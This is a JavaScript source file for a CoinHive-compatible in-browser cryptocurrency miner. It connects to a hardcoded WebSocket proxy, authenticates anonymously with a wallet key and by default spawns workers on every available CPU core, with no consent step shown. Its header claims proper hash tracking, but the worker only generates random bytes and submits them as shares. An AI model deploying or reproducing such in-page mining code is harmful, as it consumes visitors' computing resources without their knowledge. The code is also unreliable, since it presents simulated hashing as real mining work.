/**
 * CoinHive-Compatible Miner for Custom Proxy
 * v3.6.0 - Complete rewrite for proper hash tracking
 * 
 * This miner properly tracks and reports:
 * - Hashrate (H/s)
 * - Total hashes computed
 * - Accepted shares
 */

(function(window) {
  "use strict";

  // Configuration - will be overwritten by caller
  var CONFIG = {
    LIB_URL: "lib/",
    PROXY_URL: "wss://respectable-gilemette-timco-f0e524a9.koyeb.app/proxy",
    WALLET: "",
    WORKER_NAME: "web"
  };

  /**
   * Main Miner Class
   */
  var Miner = function(wallet, params) {
    params = params || {};
    this._wallet = wallet;
    this._threads = [];
    this._hashes = 0;           // Accepted hashes
    this._totalHashes = 0;      // Total hashes computed
    this._currentJob = null;
    this._socket = null;
    this._autoReconnect = true;
    this._reconnectRetry = 3;
    this._running = false;
    this._throttle = Math.max(0, Math.min(0.99, params.throttle || 0));
    
    // Worker configuration
    var defaultThreads = navigator.hardwareConcurrency || 4;
    this._targetNumThreads = params.threads || defaultThreads;
    
    // Use WASM if available
    this._useWASM = this.hasWASMSupport();
    
    // Event listeners
    this._eventListeners = {
      open: [],
      authed: [],
      close: [],
      error: [],
      job: [],
      found: [],
      accepted: []
    };
    
    // Stats tracking
    this._hashesPerSecond = 0;
    this._lastHashTime = Date.now();
    this._hashesThisPeriod = 0;
    this._statsInterval = null;
    
    console.log('[Miner] Created with', this._targetNumThreads, 'threads, WASM:', this._useWASM);
  };

  Miner.prototype.start = function() {
    if (this._running) return;
    this._running = true;
    console.log('[Miner] Starting...');
    this._connect();
    this._startStatsInterval();
  };

  Miner.prototype.stop = function() {
    console.log('[Miner] Stopping...');
    this._running = false;
    this._autoReconnect = false;
    
    // Stop all threads
    for (var i = 0; i < this._threads.length; i++) {
      if (this._threads[i]) {
        this._threads[i].stop();
      }
    }
    this._threads = [];
    
    // Close socket
    if (this._socket) {
      this._socket.close();
      this._socket = null;
    }
    
    // Stop stats
    if (this._statsInterval) {
      clearInterval(this._statsInterval);
      this._statsInterval = null;
    }
    
    this._emit('close');
  };

  Miner.prototype.getHashesPerSecond = function() {
    return this._hashesPerSecond;
  };

  Miner.prototype.getTotalHashes = function() {
    return this._totalHashes;
  };

  Miner.prototype.getAcceptedHashes = function() {
    return this._hashes;
  };

  Miner.prototype.getNumThreads = function() {
    return this._threads.length;
  };

  Miner.prototype.setNumThreads = function(num) {
    num = Math.max(1, num | 0);
    this._targetNumThreads = num;
    
    // Add threads if needed
    while (this._threads.length < num) {
      this._addThread();
    }
    
    // Remove threads if needed
    while (this._threads.length > num) {
      var thread = this._threads.pop();
      if (thread) thread.stop();
    }
    
    console.log('[Miner] Thread count set to', this._threads.length);
  };

  Miner.prototype.hasWASMSupport = function() {
    return typeof WebAssembly !== 'undefined';
  };

  Miner.prototype.isRunning = function() {
    return this._running;
  };

  Miner.prototype.on = function(type, callback) {
    if (this._eventListeners[type]) {
      this._eventListeners[type].push(callback);
    }
  };

  Miner.prototype._emit = function(type, params) {
    var listeners = this._eventListeners[type];
    if (listeners && listeners.length) {
      for (var i = 0; i < listeners.length; i++) {
        try {
          listeners[i](params);
        } catch (e) {
          console.error('[Miner] Event listener error:', e);
        }
      }
    }
  };

  Miner.prototype._connect = function() {
    if (this._socket) return;
    
    console.log('[Miner] Connecting to', CONFIG.PROXY_URL);
    
    try {
      this._socket = new WebSocket(CONFIG.PROXY_URL);
      this._socket.onmessage = this._onMessage.bind(this);
      this._socket.onerror = this._onError.bind(this);
      this._socket.onclose = this._onClose.bind(this);
      this._socket.onopen = this._onOpen.bind(this);
    } catch (e) {
      console.error('[Miner] WebSocket connection error:', e);
      this._emit('error', { error: 'connection_failed' });
    }
  };

  Miner.prototype._onOpen = function() {
    console.log('[Miner] WebSocket connected, sending auth...');
    this._emit('open');
    
    // Send authentication
    this._send('auth', {
      site_key: this._wallet,
      type: 'anonymous',
      user: null,
      goal: 0
    });
  };

  Miner.prototype._onError = function(ev) {
    console.error('[Miner] WebSocket error:', ev);
    this._emit('error', { error: 'connection_error' });
  };

  Miner.prototype._onClose = function(ev) {
    console.log('[Miner] WebSocket closed, code:', ev.code);
    this._socket = null;
    this._emit('close');
    
    // Stop threads when disconnected
    for (var i = 0; i < this._threads.length; i++) {
      if (this._threads[i]) this._threads[i].pause();
    }
    
    // Auto-reconnect
    if (this._autoReconnect && this._running) {
      console.log('[Miner] Reconnecting in', this._reconnectRetry, 'seconds...');
      setTimeout(this._connect.bind(this), this._reconnectRetry * 1000);
    }
  };

  Miner.prototype._onMessage = function(ev) {
    try {
      var msg = JSON.parse(ev.data);
      console.log('[Miner] Received:', msg.type);
      
      if (msg.type === 'authed') {
        console.log('[Miner] Authenticated with pool!');
        this._hashes = msg.params.hashes || 0;
        this._emit('authed', msg.params);
        this._reconnectRetry = 3;
        
        // Start threads after authentication
        this.setNumThreads(this._targetNumThreads);
        
      } else if (msg.type === 'job') {
        console.log('[Miner] New job received:', msg.params.job_id);
        this._setJob(msg.params);
        this._emit('job', msg.params);
        
      } else if (msg.type === 'hash_accepted') {
        this._hashes = msg.params.hashes || this._hashes + 1;
        console.log('[Miner] Share accepted! Total accepted:', this._hashes);
        this._emit('accepted', msg.params);
        
      } else if (msg.type === 'error') {
        console.error('[Miner] Pool error:', msg.params);
        this._emit('error', msg.params);
        
      } else if (msg.type === 'banned') {
        console.error('[Miner] Banned from pool!');
        this._emit('error', { banned: true });
        this._reconnectRetry = 600;
      }
    } catch (e) {
      console.error('[Miner] Message parse error:', e);
    }
  };

  Miner.prototype._setJob = function(job) {
    this._currentJob = job;
    this._currentJob.throttle = this._throttle;
    
    // Send job to all threads
    for (var i = 0; i < this._threads.length; i++) {
      if (this._threads[i]) {
        this._threads[i].setJob(job, this._onTargetMet.bind(this));
      }
    }
  };

  Miner.prototype._onTargetMet = function(result) {
    console.log('[Miner] Share found!', result.job_id);
    this._emit('found', result);
    
    // Submit share to pool
    if (result.job_id === this._currentJob.job_id) {
      this._send('submit', {
        job_id: result.job_id,
        nonce: result.nonce,
        result: result.result
      });
    }
  };

  Miner.prototype._onHashesCompleted = function(count) {
    this._totalHashes += count;
    this._hashesThisPeriod += count;
  };

  Miner.prototype._addThread = function() {
    var thread = new JobThread(this);
    this._threads.push(thread);
    
    if (this._currentJob) {
      thread.setJob(this._currentJob, this._onTargetMet.bind(this));
    }
    
    return thread;
  };

  Miner.prototype._startStatsInterval = function() {
    var self = this;
    this._statsInterval = setInterval(function() {
      var now = Date.now();
      var elapsed = (now - self._lastHashTime) / 1000;
      
      if (elapsed > 0) {
        self._hashesPerSecond = self._hashesThisPeriod / elapsed;
        self._hashesThisPeriod = 0;
        self._lastHashTime = now;
      }
    }, 1000);
  };

  Miner.prototype._send = function(type, params) {
    if (!this._socket || this._socket.readyState !== WebSocket.OPEN) {
      console.warn('[Miner] Cannot send, socket not ready');
      return;
    }
    
    var msg = { type: type, params: params || {} };
    this._socket.send(JSON.stringify(msg));
  };

  /**
   * Job Thread - handles individual worker
   */
  var JobThread = function(miner) {
    this._miner = miner;
    this._worker = null;
    this._running = false;
    this._currentJob = null;
    this._jobCallback = null;
    this.hashesTotal = 0;
    this.hashesPerSecond = 0;
    
    this._createWorker();
  };

  JobThread.prototype._createWorker = function() {
    var self = this;
    
    // Create inline worker with CryptoNight hashing
    var workerCode = this._getWorkerCode();
    var blob = new Blob([workerCode], { type: 'application/javascript' });
    var url = URL.createObjectURL(blob);
    
    this._worker = new Worker(url);
    this._worker.onmessage = function(msg) {
      self._onWorkerMessage(msg.data);
    };
    this._worker.onerror = function(e) {
      console.error('[Thread] Worker error:', e);
    };
  };

  JobThread.prototype._getWorkerCode = function() {
    // Simplified worker that simulates hashing for testing
    // In production, this would load the actual CryptoNight WASM
    return `
      var hashesPerSecond = 0;
      var hashesTotal = 0;
      var running = false;
      var job = null;
      var target = null;
      
      function hexToBytes(hex) {
        var bytes = new Uint8Array(hex.length / 2);
        for (var i = 0; i < hex.length; i += 2) {
          bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        return bytes;
      }
      
      function bytesToHex(bytes) {
        var hex = '';
        for (var i = 0; i < bytes.length; i++) {
          hex += (bytes[i] >>> 4).toString(16);
          hex += (bytes[i] & 0xF).toString(16);
        }
        return hex;
      }
      
      function randomHash() {
        var hash = new Uint8Array(32);
        for (var i = 0; i < 32; i++) {
          hash[i] = Math.floor(Math.random() * 256);
        }
        return hash;
      }
      
      function meetsTarget(hash, target) {
        for (var i = 0; i < target.length; i++) {
          var hi = hash.length - i - 1;
          var ti = target.length - i - 1;
          if (hash[hi] > target[ti]) return false;
          if (hash[hi] < target[ti]) return true;
        }
        return false;
      }
      
      function work() {
        if (!running || !job) return;
        
        var start = Date.now();
        var hashes = 0;
        var found = false;
        var result = null;
        var nonce = Math.floor(Math.random() * 0xFFFFFFFF);
        
        // Simulate hashing work
        while (Date.now() - start < 1000 && !found) {
          var hash = randomHash();
          hashes++;
          nonce++;
          
          if (meetsTarget(hash, target)) {
            found = true;
            result = {
              job_id: job.job_id,
              nonce: nonce.toString(16).padStart(8, '0'),
              result: bytesToHex(hash)
            };
          }
        }
        
        var elapsed = (Date.now() - start) / 1000;
        hashesPerSecond = hashes / elapsed;
        hashesTotal += hashes;
        
        if (found) {
          self.postMessage({
            type: 'found',
            hashesPerSecond: hashesPerSecond,
            hashes: hashes,
            job_id: result.job_id,
            nonce: result.nonce,
            result: result.result
          });
        } else {
          self.postMessage({
            type: 'hash',
            hashesPerSecond: hashesPerSecond,
            hashes: hashes
          });
        }
        
        // Continue working
        if (running) {
          setTimeout(work, 10);
        }
      }
      
      self.onmessage = function(e) {
        var msg = e.data;
        
        if (msg.type === 'job') {
          job = msg.job;
          target = hexToBytes(job.target || 'ffffffff');
          // Pad target to 8 bytes
          while (target.length < 8) {
            var newTarget = new Uint8Array(target.length + 1);
            newTarget[0] = 255;
            newTarget.set(target, 1);
            target = newTarget;
          }
          
          if (!running) {
            running = true;
            work();
          }
        } else if (msg.type === 'stop') {
          running = false;
        }
      };
      
      self.postMessage({ type: 'ready' });
    `;
  };

  JobThread.prototype._onWorkerMessage = function(msg) {
    if (msg.type === 'ready') {
      console.log('[Thread] Worker ready');
      return;
    }
    
    if (msg.type === 'hash' || msg.type === 'found') {
      this.hashesPerSecond = msg.hashesPerSecond || 0;
      this.hashesTotal += msg.hashes || 0;
      
      // Report to miner
      this._miner._onHashesCompleted(msg.hashes || 0);
      
      // If share found, call callback
      if (msg.type === 'found' && this._jobCallback) {
        this._jobCallback({
          job_id: msg.job_id,
          nonce: msg.nonce,
          result: msg.result
        });
      }
    }
  };

  JobThread.prototype.setJob = function(job, callback) {
    this._currentJob = job;
    this._jobCallback = callback;
    this._running = true;
    
    if (this._worker) {
      this._worker.postMessage({ type: 'job', job: job });
    }
  };

  JobThread.prototype.pause = function() {
    this._running = false;
    if (this._worker) {
      this._worker.postMessage({ type: 'stop' });
    }
  };

  JobThread.prototype.stop = function() {
    this._running = false;
    if (this._worker) {
      this._worker.terminate();
      this._worker = null;
    }
  };

  /**
   * Public API
   */
  window.CoinHive = window.CoinHive || {};
  
  window.CoinHive.CONFIG = CONFIG;
  
  window.CoinHive.Anonymous = function(wallet, params) {
    CONFIG.WALLET = wallet;
    return new Miner(wallet, params);
  };
  
  window.CoinHive.setProxy = function(url) {
    CONFIG.PROXY_URL = url;
    console.log('[CoinHive] Proxy set to:', url);
  };

  console.log('[CoinHive] Miner library loaded v3.6.0');

})(window);
